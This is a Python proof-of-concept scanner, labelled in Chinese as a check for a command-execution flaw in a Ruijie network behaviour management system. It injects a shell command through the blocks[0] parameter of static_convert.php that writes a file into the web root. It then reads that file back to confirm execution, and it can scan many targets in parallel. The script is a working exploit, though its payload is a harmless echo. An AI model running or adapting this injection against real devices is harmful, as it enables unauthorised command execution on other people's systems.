import requests
import argparse
from multiprocessing.dummy import Pool
def main():
    parser = argparse.ArgumentParser('这是一个锐捷上网行为管理系统 static_convert 命令执行漏洞检测脚本')
    parser.add_argument('-u', '--url', help='测试单个url', dest='url')
    parser.add_argument('-f', '--file', help='测试多个url', dest='file')
    args = parser.parse_args()
    pool = Pool(30)
    try:
        if args.url:
            check(args.url)
        elif args.file:
            targets = []
            with open(args.file,"r") as f:
                for line in f.readlines():
                    line=line.strip()
                    if 'http' in line:
                        targets.append(line)
                    else:
                        line="http://"+line
                        targets.append(line)
            pool.map(check,targets)
            pool.close()
    except Exception as d:
        print(d)
def check(url1):
    try:
        headers = {
            'User-Agent': 'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/125.0.0.0 Safari/537.36 Edg/125.0.0.0',
            'Content-Type': 'application/x-www-form-urlencoded'
        }
        url=f"{url1}/view/IPV6/naborTable/static_convert.php?blocks[0]=||echo%20'HelloWorldTest1'>/var/www/html/tmptest%0A "
        response = requests.get(url, headers=headers, verify=False, timeout=5)
        url2=f"{url1}/tmptest"
        response2=requests.get(url2, headers=headers, verify=False, timeout=5)
        if response.status_code == 200 and response2.status_code == 200 and 'HelloWorldTest' in response2.text:
            print(f"[*]{url1}存在漏洞")
        else:
            print(f"[-]{url1}不存在漏洞")

    except Exception as e:
        print(e)

if __name__ == '__main__':
    main()